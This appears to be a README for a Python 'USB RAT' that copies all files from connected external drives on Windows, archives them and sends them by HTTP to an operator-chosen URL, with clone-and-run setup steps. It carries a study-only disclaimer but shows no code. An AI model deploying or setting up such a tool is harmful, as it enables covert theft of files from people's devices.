# HTTP Usb Rat script in Python
### The script was created for the purpose of studying
#
### Description
This script is able to capture all the files of an external device connected while the script is running, and then archive all the files into one single archive, which is then sent via HTTP to the url you specified
- Works on Windows
#
### Installation
In the file rat.py there are 2 variables (sendUrl and capturedFileMaxSize) whose values you should change to your own
- git clone https://github.com/alexop89056/usb-rat
- cd usb-rat
- python -m pip install -r requirements.txt
- python rat.py
